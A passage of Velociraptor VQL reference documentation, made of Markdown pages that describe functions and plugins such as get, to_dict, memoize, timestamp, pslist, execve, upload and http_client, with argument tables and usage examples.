|[lowcase](lowcase)|<span class='vql_type'>Function</span>|Returns the lowercase version of a string|
|[memoize](memoize)|<span class='vql_type'>Function</span>|Memoize a query into memory|
|[netstat](netstat)|<span class='vql_type'>Plugin</span>|Collect network information|
|[now](now)|<span class='vql_type'>Function</span>|Returns the current time in seconds since epoch|
|[plist](plist)|<span class='vql_type'>Function</span>|Parse plist file|
|[process_tracker_get](process_tracker_get)|<span class='vql_type'>Function</span>|Get a single process from the global tracker|
|[process_tracker_pslist](process_tracker_pslist)|<span class='vql_type'>Plugin</span>|List all processes from the process tracker|
|[pslist](pslist)|<span class='vql_type'>Plugin</span>|Enumerate running processes|
|[range](range)|<span class='vql_type'>Plugin</span>|Iterate over range|
|[read_file](read_file)|<span class='vql_type'>Function</span>|Read a file into a string|
|[read_file](read_file)|<span class='vql_type'>Plugin</span>|Read files in chunks|
|[regex_transform](regex_transform)|<span class='vql_type'>Function</span>|Search and replace a string with multiple regex|
|[scope](scope)|<span class='vql_type'>Function</span>|return the scope|
|[scope](scope)|<span class='vql_type'>Plugin</span>|The scope plugin returns the current scope as a single row|
|[set](set)|<span class='vql_type'>Function</span>|Sets the member field of the item|
|[sigma](sigma)|<span class='vql_type'>Plugin</span>|Evaluate sigma rules|
|[split](split)|<span class='vql_type'>Function</span>|Splits a string into an array based on a regexp separator|
|[stat](stat)|<span class='vql_type'>Function</span>|Get file information|
|[str](str)|<span class='vql_type'>Function</span>|Returns the string representation of the provided data|
|[substr](substr)|<span class='vql_type'>Function</span>|Create a substring from a string|
|[switch](switch)|<span class='vql_type'>Plugin</span>|Conditional execution of multiple queries in order|
|[tempdir](tempdir)|<span class='vql_type'>Function</span>|Create a temporary directory|
|[tempfile](tempfile)|<span class='vql_type'>Function</span>|Create a temporary file and write some data into it|
|[timestamp](timestamp)|<span class='vql_type'>Function</span>|Convert from different types to a time|
|[to_dict](to_dict)|<span class='vql_type'>Function</span>|Construct a dict from a query|
|[unzip](unzip)|<span class='vql_type'>Plugin</span>|Unzips a file into a directory|
|[upload](upload)|<span class='vql_type'>Function</span>|Upload a file to the upload service|

---END OF FILE---

======
FILE: /content/vql_reference/popular/process_tracker_pslist/_index.md
======
---
title: process_tracker_pslist
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## process_tracker_pslist
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

List all processes from the process tracker.


---END OF FILE---

======
FILE: /content/vql_reference/popular/get/_index.md
======
---
title: get
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## get
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
item||Any
member||string
field||Any
default||Any

### Description

Gets the member field from the item.

This is useful to index an item from an array.

### Example

```vql
select get(item=[dict(foo=3), 2, 3, 4], member='0.foo') AS Foo from scope()
```
```json
[
  {
    "Foo": 3
  }
]
```

### Notes

Using the member parameter you can index inside a nested dictionary using
dots to separate the layers.

If you need to access a field with dots in its name, you can use the field
parameter which simply fetches the named field.

If the item parameter is not specified we use the scope. Basically
`get(item=scope(), field=fieldname)` is same as `get(field=fieldname)`.

### See also

- [set]({{< ref "/vql_reference/popular/set/" >}}): Sets the member field of
the item.



---END OF FILE---

======
FILE: /content/vql_reference/popular/set/_index.md
======
---
title: set
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## set
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
item|A dict to set|Any (required)
field|The field to set|string (required)
value||Any (required)

### Description

Sets the member field of the item.

If item is omitted sets the scope.

### See also

- [get]({{< ref "/vql_reference/popular/get/" >}}): Gets the member field from the item.



---END OF FILE---

======
FILE: /content/vql_reference/popular/scope/_index.md
======
---
title: scope
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## scope
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

return the scope.



<div class="vql_item"></div>


## scope
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

The scope plugin returns the current scope as a single row.

The main use for this plugin is as a NOOP plugin in those cases we
dont want to actually run anything.

### Example

```vql
SELECT 1+1 As Two FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/popular/to_dict/_index.md
======
---
title: to_dict
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## to_dict
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
item||Any

### Description

Construct a dict from a query.

Sometimes we need to build a dict object where both the names of
the keys and their values are not known in advance - they are
calculated from another query. In this case we can use the
to_dict() function to build a dict from a query. The query needs
to emits as many rows as needed with a column called `_key` and
one called `_value`. The `to_dict()` will then construct a dict
from this query.

### Notes

1. In VQL all dicts are ordered, so the order in which rows appear
in the query will determine the dict's key order.

2. VQL dicts always have string keys, if the `_key` value is not a
string the row will be ignored.

### Example

The following (rather silly) example creates a dict mapping Pid to
ProcessNames in order to cache Pid->Name lookups. We then resolve
Pid to Name within other queries. Note the use of <= to
materialize the dict into memory once.

```vql
LET PidLookup <= to_dict(item={
    SELECT str(str=Pid) AS _key, Name AS _value
    FROM pslist()
})

SELECT Pid, get(item=PidLookup, field=str(str=Pid))
FROM pslist()
```



---END OF FILE---

======
FILE: /content/vql_reference/popular/tempdir/_index.md
======
---
title: tempdir
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## tempdir
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
remove_last|If set we delay removal as much as possible.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>

### Description

Create a temporary directory. The directory will be removed when the query ends.


---END OF FILE---

======
FILE: /content/vql_reference/popular/regex_transform/_index.md
======
---
title: regex_transform
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## regex_transform
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
source|The source string to replace.|string (required)
map|A dict with keys reg, values substitutions.|ordereddict.Dict (required)
key|A key for caching|string

### Description

Search and replace a string with multiple regex. Note you can use $1
to replace the capture string.

```vql
SELECT regex_transform(source="Hello world", map=dict(
   `^Hello`="Goodbye",
   `world`="Space"), key="A")
FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/popular/count/_index.md
======
---
title: count
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## count
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
items|Not used anymore|Any

### Description

Counts the items.

This function is an aggregation function that counts the number of
times it is evaluated per group by context. It is useful in a
GROUP BY clause to count the number of items in each group.

You can also use it in a regular query to produce a row
count. NOTE: When used in this way it only counts the total number
of rows that are actually evaluated (i.e. not filtered out) due to
the lazy evaluation property of VQL columns.

For a full discussion of aggregate functions see
https://docs.velociraptor.app/docs/vql/#aggregate-functions



---END OF FILE---

======
FILE: /content/vql_reference/popular/expand/_index.md
======
---
title: expand
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## expand
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|A path with environment escapes|string (required)

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Expand the path using the environment.

This function expands environment variables into the path. It is
normally needed after using registry values of type REG_EXPAND_SZ as
they typically contain environment strings. Velociraptor does not
automatically expand such values since environment variables typically
depend on the specific user account which reads the registry value
(different user accounts can have different environment variables).

This function uses the Golang standard for expanding variables
(using $varname ). On Windows, we also support using the Windows
notation with % before and after the variable name.

```vql
SELECT expand(path="My Username is %USERNAME%")
FROM scope()
```

### Notes

The environment strings are set per user and Velociraptor's
own environment may not reflect any other process's
environment. See `Windows.Forensics.ProcessInfo` for a
forensically sound manner of obtaining the environment from any
process.



---END OF FILE---

======
FILE: /content/vql_reference/popular/switch/_index.md
======
---
title: switch
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## switch
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


### Description

Conditional execution of multiple queries in order

Executes each query in order. If a query returns any rows, those
are emitted. Any further queries are ignored.



---END OF FILE---

======
FILE: /content/vql_reference/popular/lowcase/_index.md
======
---
title: lowcase
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## lowcase
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|The string to process|string (required)

### Description

Returns the lowercase version of a string.


---END OF FILE---

======
FILE: /content/vql_reference/popular/items/_index.md
======
---
title: items
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## items
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
item||Any

### Description

Iterate over dict members producing _key and _value columns

This can be used to filter dict items by feeding the results to
`to_dict()`




<div class="vql_item"></div>


## items
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
item|The item to enumerate.|Any

### Description

Enumerate all members of the item (similar to Python's items() method).

This plugin allows iteration over dicts or queries.

### Iterating dicts

If the item is a dict, then this plugin will iterate over its keys
and values producing two columns:

* The `_key` column is the dictionary key
* The `_value` column is the dictionary value

### Iterating queries

For queries or arrays, the `items()` plugin will produce two columns:

* The `_key` column is the row index starting from 0
* The `_value` column is the row itself as a dict.

The `items()` query is useful to treat the results of another
query as a dict instead of a row. This is useful when the query
produces unpredictable columns or you need to operate over the
column names somehow.

### Example

```vql
SELECT * FROM items(item={ SELECT * FROM info() })
```

Produces:

```json
[
  {
    "_key": 0,
    "_value": {
      "Hostname": "DESKTOP-BTI2T9T",
      "Uptime": 20445,
      "BootTime": 1641029930,
      "Architecture": "amd64"
    }
  }
]
```



---END OF FILE---

======
FILE: /content/vql_reference/popular/pslist/_index.md
======
---
title: pslist
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## pslist
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
pid|A process ID to list. If not provided list all processes.|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Enumerate running processes.

When specifying the pid this operation is much faster so if you are
interested in specific processes, the pid should be
specified. Otherwise, the plugin returns all processes one on each
row.



---END OF FILE---

======
FILE: /content/vql_reference/popular/humanize/_index.md
======
---
title: humanize
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## humanize
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
bytes|Format bytes with units (e.g. MB)|int64
ibytes|Format bytes with units (e.g. MiB)|int64
time|Format time (e.g. 2 hours ago)|time.Time
comma|Format integer with comma (e.g. 1,230)|int64

### Description

Format items in human readable way.

Formats a byte count in human readable way (e.g. Mb, Gb etc).



---END OF FILE---

======
FILE: /content/vql_reference/popular/foreach/_index.md
======
---
title: foreach
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## foreach
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
row|A query or slice which generates rows.|LazyExpr (required)
query|Run this query for each row.|StoredQuery
async|If set we run all queries asynchronously (implies workers=100).|bool
workers|Total number of asynchronous workers.|int64
column|If set we only extract the column from row.|string

### Description

Executes 'query' once for each row in the 'row' query.

The columns in row will be stored in the scope that is used to
evaluate the query therefore the query may refer to the results
from the `row` query.

Foreach in VQL is essentially the same as an SQL JOIN operator but
much simpler to use.

If the `workers` parameter is specified, the plugin will spawn
this many workers and evaluate the `query` query in each worker
concurrently if possible. It is safe to use a large number here
(say 100) to utilize all available cores.



---END OF FILE---

======
FILE: /content/vql_reference/popular/execve/_index.md
======
---
title: execve
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## execve
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
argv|Argv to run the command with.|list of string (required)
sep|The separator that will be used to split the stdout into rows.|string
length|Size of buffer to capture output per row.|int64
env|Environment variables to launch with.|LazyExpr
cwd|If specified we change to this working directory first.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">EXECVE</span>

### Description

This plugin launches an external command and captures its STDERR,
STDOUT and return code. The command's stdout is split using the `sep`
parameter as required.

This plugin is mostly useful for running arbitrary code on the
client. If you do not want to allow arbitrary code to run, you can
disable this by setting the `prevent_execve` flag in the client's
config file. Be aware than many artifacts require running external
commands to collect their output though.

We do not actually transfer the external program to the system
automatically. If you need to run programs which are not usually
installed (e.g. Sysinternal's autoruns.exe) you will need to use
Velociraptor's external tools feature to deliver and manage the
tools on the client.

https://docs.velociraptor.app/docs/extending_vql/#using-external-tools

### Notes

The plugin receives an array of arguments which are passed
to the `execve()` system call as an array (on Windows they are
properly escaped into a command line). This means that you do not
need to escape or quote any special characters in the command.

We noticed people often do this or variations on it:
```vql
LET PathToCacls = "C:/Program Files"
LET CommandLine <= "cacls.exe " + '"' + PathToCacls + '"'
SELECT * FROM execve(argv=["powershell", "-c", CommandLine])
```

While this appears to work it is incorrect, fragile and
susceptible to a simple shell injection (for example if the
`PathToCacls` contains quotes).

As a rule we prefer to not run commands through the shell at all
since it is not needed and unsafe. The correct approach is always
to split the `argv` into an array of distinct arguments:

```vql
LET PathToCacls = "C:/Program Files"
SELECT * FROM execve(argv=["cacls.exe", PathToCacls])
```

This calls the program directly and is not susceptible to escaping
or quoting issues (since there is no shell involved). Additionally
it does not invoke powershell which means that any execution
artifacts are not trampled by this VQL.



---END OF FILE---

======
FILE: /content/vql_reference/popular/atoi/_index.md
======
---
title: atoi
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## atoi
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|A string to convert to int|Any (required)

### Description

Convert a string to an integer.

The string may begin with a sign ("+" or "-") and a prefix
indicating a base: "0b" for base2 , "0" or "0o" for base8, "0x"
for base16. It may contain underscores ("_").

This function is essentially a wrapper around Golang's
`strconv.ParseInt()` function.



---END OF FILE---

======
FILE: /content/vql_reference/popular/read_file/_index.md
======
---
title: read_file
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## read_file
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
length|Max length of the file to read.|int
offset|Where to read from the file.|int64
filename|One or more files to open.|OSPath (required)
accessor|An accessor to use.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Read a file into a string.



<div class="vql_item"></div>


## read_file
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
chunk|length of each chunk to read from the file.|int
max_length|Max length of the file to read.|int
filenames|One or more files to open.|list of OSPath (required)
accessor|An accessor to use.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Read files in chunks.

This plugin reads a file in chunks and returns each chunks as a separate row.

It is useful when we want to report file contents for small files like
configuration files etc.

The returned row contains the following columns: data, offset, filename



---END OF FILE---

======
FILE: /content/vql_reference/popular/tempfile/_index.md
======
---
title: tempfile
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## tempfile
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
data|Data to write in the tempfile.|list of string
extension|An extension to place in the tempfile.|string
permissions|Required permissions (e.g. 'x').|string
remove_last|If set we delay removal as much as possible.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>

### Description

Create a temporary file and write some data into it.

The file will be automatically removed when the query completes.



---END OF FILE---

======
FILE: /content/vql_reference/popular/memoize/_index.md
======
---
title: memoize
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## memoize
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query|Query to expand into memory|LazyExpr (required)
key|The name of the column to use as a key.|string (required)
period|The latest age of the cache.|int64
name|The name of this cache.|string

### Description

Memoize a query into memory.

Memoizing a query means to cache the results of the query so they
can be accessed quickly.

Consider the following query:

```vql
LET ProcessDetails(ProcessPid) = SELECT Name, Pid, Ppid FROM pslist()
  WHERE Pid=ProcessPid
```

This query retrieves the process details for any Pid such as the
Name, Pid and parent Pid.

While this query works, imagine having to use it in a large query
to resolve many different processes. Each time the function is
called the pslist() plugin is run over all processes and the
correct process is selected - this can lead to thousands of
pslist() executions!

We can solve this by memoizing the results of the query -
i.e. storing them in memory and retrieving a single row based on a
key.

```vql
LET m <= memoize(query={
   SELECT str(str=Pid) AS Key, Name, Pid, Ppid FROM pslist()
}, key='Key')
```

The `memoize()` function looks like a `dict()` and when accessed
will automatically run the query once and cache its rows. The Key
column of the query is used as the key of the dict.

You can access the cache using the `get()` function or the `.`
operator. If the key matches the entire row is retrieved:

```vql
SELECT get(item=m, field=str(str=Pid)).Name AS ProcessName
FROM source()
```



---END OF FILE---

======
FILE: /content/vql_reference/popular/upload/_index.md
======
---
title: upload
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## upload
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|The file to upload|OSPath (required)
name|The name of the file that should be stored on the server|OSPath
accessor|The accessor to use|string
mtime|Modified time to record|Any
atime|Access time to record|Any
ctime|Change time to record|Any
btime|Birth time to record|Any

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Upload a file to the upload service. For a Velociraptor client this
will upload the file into the flow and store it in the server's file store.

If Velociraptor is run locally the file will be copied to the
`--dump_dir` path or added to the triage evidence container.



---END OF FILE---

======
FILE: /content/vql_reference/popular/dict/_index.md
======
---
title: dict
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## dict
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Construct a dict from arbitrary keyword args.

This function creates a dictionary (a key/value map). NOTE: In VQL
dictionaries always have string keys. Sometimes key names contain
special characters like dots etc, in that case you can use
backticks to escape the name. For example:

```vql
SELECT dict(Foo="Bar", `Name.With.Dots`="Baz")
FROM scope()
```

See the `to_dict()` function to create dicts from a query with
unpredictable key names.



---END OF FILE---

======
FILE: /content/vql_reference/popular/range/_index.md
======
---
title: range
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## range
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
start|Start index (0 based - default 0)|int64
end|End index (0 based)|int64 (required)
step|Step (default 1)|int64

### Description

Iterate over range.


---END OF FILE---

======
FILE: /content/vql_reference/popular/flatten/_index.md
======
---
title: flatten
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## flatten
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
query||StoredQuery (required)

### Description

Flatten the columns in query. If any column repeats then we repeat the entire row once for each item.


---END OF FILE---

======
FILE: /content/vql_reference/popular/plist/_index.md
======
---
title: plist
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## plist
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|A list of files to parse.|OSPath (required)
accessor|The accessor to use.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parse plist file


---END OF FILE---

======
FILE: /content/vql_reference/popular/basename/_index.md
======
---
title: basename
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## basename
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|Extract directory name of path|Any (required)
sep|Separator to use (default /)|string
path_type|Type of path (e.g. windows, linux)|string

### Description

Return the basename of the path.

### Example

```vql
basename(path="/foo/bar") -> "bar"
```

Related: `dirname()`



---END OF FILE---

======
FILE: /content/vql_reference/popular/info/_index.md
======
---
title: info
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## info
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>


<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">MACHINE_STATE</span>

### Description

Get information about the running host.

This plugin returns a single row with information about the current
system. The information includes the Hostname, Uptime, OS, Platform
etc.

This plugin is very useful in preconditions as it restricts a query to
certain OS or versions.



---END OF FILE---

======
FILE: /content/vql_reference/popular/split/_index.md
======
---
title: split
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## split
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|The value to split|string (required)
sep|The separator that will be used to split|string
sep_string|The separator as string that will be used to split|string

### Description

Splits a string into an array based on a regexp separator.


---END OF FILE---

======
FILE: /content/vql_reference/popular/process_tracker_get/_index.md
======
---
title: process_tracker_get
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## process_tracker_get
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
id|Process ID.|string (required)

### Description

Get a single process from the global tracker.


---END OF FILE---

======
FILE: /content/vql_reference/popular/filter/_index.md
======
---
title: filter
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## filter
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
list|A list of items to filter|list of Any (required)
regex|A regex to test each item|string
condition|A VQL lambda to use to filter elements|Lambda

### Description

Filters an array by regex or condition.

Note that if a condition is specified as well as a regex then only
the condition is applied.

### Examples

```vql
filter(list=["AA", "AB", "BA", "BB"], regex="^A") -> ["AA", "AB"]
```

```vql
filter(list=[1, 2, 3, 4, 5, 6], condition="x=>x > 3") -> [4, 5, 6]
```



---END OF FILE---

======
FILE: /content/vql_reference/popular/int/_index.md
======
---
title: int
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## int
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
int|The integer to round|Any

### Description

Truncate to an integer.

If provided a string, the function will try to parse it into an integer.



---END OF FILE---

======
FILE: /content/vql_reference/popular/timestamp/_index.md
======
---
title: timestamp
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## timestamp
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
epoch||Any
cocoatime||int64
mactime|HFS+|int64
winfiletime||int64
string|Guess a timestamp from a string|string
format|A format specifier as per the Golang time.Parse|string

### Description

Convert from different types to a time.Time.

This is one of the most important functions in VQL. We need to
convert timestamps very frequently from various
representations. Most commonly from strings, Unix epoch times etc.

This function is pretty smart and tries to do the right thing most
of the time automatically. For example, you can provide the epoch
parameter as an integer representing seconds since the epoch,
milliseconds or microseconds since the epoch.

```vql
SELECT timestamp(epoch=1630414425) AS Time1,
       timestamp(epoch=1630414425000) AS Time2,
       timestamp(epoch=1630414425000000) AS Time3,
FROM scope()
```

You can also provide a string, and `timestamp()` will try to parse
it by guessing what it represents. For example:

```vql
SELECT timestamp(string='March 3 2019'),
       timestamp(string='07/25/2019 5pm')
FROM scope()
```

For more control over the parsing of strings, use the `format`
parameter to specify a template which will be used to parse the
timestamp.

The format template uses a constant time as an example of how the
time is layed out. It represents a template for a timestamp that
**must** use the following date constants

* Year: "2006" "06"
* Month: "Jan" "January"
* Textual day of the week: "Mon" "Monday"
* Numeric day of the month: "2" "_2" "02"
* Numeric day of the year: "__2" "002"
* Hour: "15" "3" "03" (PM or AM)
* Minute: "4" "04"
* Second: "5" "05"
* AM/PM mark: "PM"
* "-0700"  ±hhmm
* "-07:00" ±hh:mm
* "-07"    ±hh

```vql
SELECT timestamp(string="8/30/2021 6:01:28 PM",
                 format="1/2/2006 3:04:05 PM")
FROM scope()
```

If the timestamp is ambiguous - i.e. does not specify a timezone
you can provide a timezone hint using the `PARSE_TZ` VQL
variable. This will only be used if the timestamp is ambiguous. If
`PARSE_TZ` is `local` then we use the local timezone on the
endpoint.

### Example

```vql
LET PARSE_TZ <= "local"

SELECT timestamp(string="Thu Aug 29 2024 21:03"),
       timestamp(string="Thu Aug 29 2024 21:03 CEST")
FROM scope()
```

The first timestamp will be parsed according to the local timezone
because it is ambiguous. However, the second timestamp is not
ambiguous and `PARSE_TZ` has no effect.

Internally VQL uses Golang's
[time.Time](https://golang.org/pkg/time/#Time) object to represent
times and this is what is returned by the `timestamp()` VQL
function. This object has a number of useful methods which are
available via fields on the timestamp object:

```json
{
  "Day": 26,
  "Hour": 8,
  "ISOWeek": 2024,
  "IsDST": "false",
  "IsZero": "false",
  "Minute": 53,
  "Month": 3,
  "Nanosecond": 231540468,
  "Second": 37,
  "String": "2024-03-26T06:53:37Z",
  "UTC": "2024-03-26T06:53:37.231540468Z",
  "Unix": 1711436017,
  "UnixMicro": 1711436017231540,
  "UnixMilli": 1711436017231,
  "UnixNano": 1711436017231540500,
  "Weekday": 2,
  "Year": 2024,
  "YearDay": 86,
  "Zone": "SAST"
}
```

For example `timestamp(epoch=now()).Month` is the current month.

To perform time manipulations you can convert times back to the
seconds from epoch, then add/subtract times. For example the
following calculates the time exactly one day (24 hours) before
the stated time:

```vql
SELECT timestamp(epoch=timestamp(epoch="2024-03-26T06:53:37Z").Unix - 86400)
FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/popular/now/_index.md
======
---
title: now
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## now
<span class='vql_type label label-warning pull-right page-header'>Function</span>


### Description

Returns the current time in seconds since epoch.

Note that an integer value is returned, not a timestamp.

Typically this function is used together with the `timestamp` function to
create a timestamp object which can be used in datetime comparisons.

### Examples

Creating a timestamp representing the current time:

`timestamp(epoch=now())`

Creating a timestamp representing an hour ago:

`timestamp(epoch=now() - 3600)`

Using `now()` in timestamp arithmetic:

```vql
SELECT * FROM flows(client_id="C.8cfee3cef5dc6915")
WHERE state =~ "FINISHED" AND timestamp(epoch=active_time) > now() - 60 * 60 * 24
```

Note that the above time comparison works even though `now() - 60 * 60 * 24`
results in an integer. This is because one of the operands is a timestamp
object, so VQL will convert the int to a timestamp for purposes of the
comparison.

### See also

- [timestamp]({{< ref "/vql_reference/popular/timestamp/" >}})



---END OF FILE---

======
FILE: /content/vql_reference/popular/unzip/_index.md
======
---
title: unzip
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## unzip
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|File to unzip.|OSPath (required)
accessor|The accessor to use|string
filename_filter|Only extract members matching this regex filter.|string
output_directory|Where to unzip to|string (required)
type|The type of file (default autodetected from file extension - zip or tgz or tar.gz).|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>
<span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Unzips a file into a directory.

This plugin supports a number of compression formats:
1. Zip files
2. Tar gz files.

The type of the file will be detected by the file extension, or
else you can force a type using the `type` parameter (`tgz` or
`zip`).



---END OF FILE---

======
FILE: /content/vql_reference/popular/http_client/_index.md
======
---
title: http_client
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## http_client
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
url|The URL to fetch|string (required)
params|Parameters to encode as POST or GET query strings|ordereddict.Dict
headers|A dict of headers to send.|ordereddict.Dict
method|HTTP method to use (GET, POST, PUT, PATCH, DELETE)|string
data|If specified we write this raw data into a POST request instead of encoding the params above.|string
chunk_size|Read input with this chunk size and send each chunk as a row|int
disable_ssl_security|Disable ssl certificate verifications (deprecated in favor of SkipVerify).|bool
skip_verify|Disable ssl certificate verifications.|bool
tempfile_extension|If specified we write to a tempfile. The content field will contain the full path to the tempfile.|string
remove_last|If set we delay removal as much as possible.|bool
root_ca|As a better alternative to disable_ssl_security, allows root ca certs to be added here.|string
cookie_jar|A cookie jar to use if provided. This is a dict of cookie structures.|ordereddict.Dict
user_agent|If specified, set a HTTP User-Agent.|string
secret|If specified, use this managed secret. The secret should be of type 'HTTP Secrets'. Alternatively specify the Url as secret://name|string
files|If specified, upload these files using multipart form upload. For example [dict(file="My filename.txt", path=OSPath, accessor="auto"),]|list of ordereddict.Dict

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">COLLECT_SERVER</span>

### Description

Make a http request.

This plugin makes a HTTP connection using the specified method. The
headers and parameters may be specified. The plugin reads the
specified number of bytes per returned row.

If `disable_ssl_security` is specified we do not enforce SSL
integrity. This is required to connect to self signed ssl web
sites. For example many API handlers are exposed over such
connections.

{{% notice note %}}

